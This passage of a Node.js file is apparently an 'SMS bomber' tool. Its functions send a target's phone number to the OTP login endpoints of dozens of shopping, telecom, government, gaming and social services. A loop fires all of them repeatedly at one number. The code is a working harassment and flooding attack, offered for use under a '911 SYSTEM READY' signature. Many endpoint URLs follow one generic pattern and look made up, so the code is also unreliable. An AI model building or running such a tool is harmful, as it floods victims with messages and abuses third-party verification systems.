        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Kültür Sanat: HIT")); });
    }

    async function biletbayisi(no) {
        request.post({ url: "https://api.biletbayisi.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Bilet Bayisi: HIT")); });
    }
    async function steam(no) {
        request.post({ url: "https://api.steampowered.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Steam: HIT")); });
    }

    async function epic_games(no) {
        request.post({ url: "https://api.epicgames.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Epic Games: HIT")); });
    }

    async function riot_games(no) {
        request.post({ url: "https://api.riotgames.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Riot Games: HIT")); });
    }

    async function roblox(no) {
        request.post({ url: "https://api.roblox.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Roblox: HIT")); });
    }

    async function razer_gold(no) {
        request.post({ url: "https://api.razer.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Razer Gold: HIT")); });
    }

    async function game_sales(no) {
        request.post({ url: "https://api.gamesatis.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] GameSatış: HIT")); });
    }

    async function item_satis(no) {
        request.post({ url: "https://api.itemsatis.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] İtemSatış: HIT")); });
    }

    async function perdigital(no) {
        request.post({ url: "https://api.perdigital.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Perdigital: HIT")); });
    }

    async function bynogame(no) {
        request.post({ url: "https://api.bynogame.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] ByNoGame: HIT")); });
    }

    async function oyunfor(no) {
        request.post({ url: "https://api.oyunfor.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Oyunfor: HIT")); });
    }

    async function pubg_mobile(no) {
        request.post({ url: "https://api.pubgmobile.com/v1/auth/otp", json: { "phone": "90" + no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] PUBG Mobile: HIT")); });
    }

    async function free_fire(no) {
        request.post({ url: "https://api.freefire.com/v1/auth/otp", json: { "phone": no } }, 
        (err, res, body) => { if (!err && res.statusCode == 200) console.log(chalk.green("[+] Free Fire: HIT")); });
    }
    // --- FİNAL ATEŞLEME MEKANİZMASI ---

    for (let i = 0; i < amount; i++) {
        // Ana Servisler
        getir(n); yemeksepeti(n); tiklagelsin(n); migros(n); bim(n); a101(n); sok(n); istgelsin(n);
        
        // E-Ticaret & Hizmet
        dominos(n); tasiyanlar(n); letgo(n); dolap(n); modanisa(n); ebebek(n); flo(n); boyner(n); 
        lcw(n); defacto(n); koctas(n); tekzen(n); hayaladasi(n); herseyburada(n); fuzul(n); 
        pazarama(n); tazedirekt(n); englishhome(n); madamecoco(n); evidea(n); civil(n); joker(n); 
        babymall(n); sobe(n);
        
        // Yemek & Sosyal
        banabi(n); glovo(n); mcdonalds(n); burgerking(n); popeyes(n); usta_pideci(n); sbarro(n); 
        arbys(n); kfc(n); pizza_hut(n); kahve_dunyasi(n); starbucks(n); nero(n);
        
        // Medya & Operatör
        tivibu(n); dsmart(n); digiturk(n); exxen(n); blu_tv(n); gain(n); tod(n); bein_connect(n); 
        vodafone(n); turk_telekom(n); turkcell(n); tcell_pasaj(n); fenercell(n); gsmobile(n); 
        trabzoncell(n); bimcell(n); pttcell(n); teknosacell(n); vestelcell(n); netgsm(n); 
        millenicom(n); dsmart_net(n);
        
        // Kamu & Eğitim
        e_devlet(n); mhrs(n); e_nabiz(n); iskur(n); gib(n); kyk(n); ibb(n); abb(n); izmir_bel(n); 
        bursa_bel(n); antalya_bel(n); konya_bel(n); meb(n); osym(n); aof(n); eba(n); udemy(n); 
        coursera(n); duolingo(n); edx(n); khan_academy(n); busuu(n); memrise(n); babbel(n);
        
        // Sosyal Medya & Seyahat
        tiktok(n); instagram(n); snapchat(n); twitter(n); telegram(n); whatsapp(n); discord(n); 
        twitch(n); tinder(n); badoo(n); happn(n); azar(n); obilet(n); enuygun(n); ucakbileti(n); 
        etstur(n); jollytur(n); tatilbudur(n); moov(n); tiktak(n); marti(n); binbin(n); freenow(n); 
        bi_taksi(n);
        
        // Eğlence & Oyun
        biletix(n); biletinial(n); passo(n); cinemaximum(n); bilet_com(n); bubilet(n); sinemaj(n); 
        tiyatrolar_com(n); biletino(n); mobilet(n); kultursanat(n); biletbayisi(n); steam(n); 
        epic_games(n); riot_games(n); roblox(n); razer_gold(n); game_sales(n); item_satis(n); 
        perdigital(n); bynogame(n); oyunfor(n); pubg_mobile(n); free_fire(n);
    }
}

// KURUCU İMZASI
module.exports = smsBomber;

console.log(chalk.red.bold("\n--- 911 SYSTEM READY ---"));
console.log(chalk.white("Sistem Kurucu: 911 ERAY\n"));
// Update: Tue Apr 28 00:53:48 +03 2026
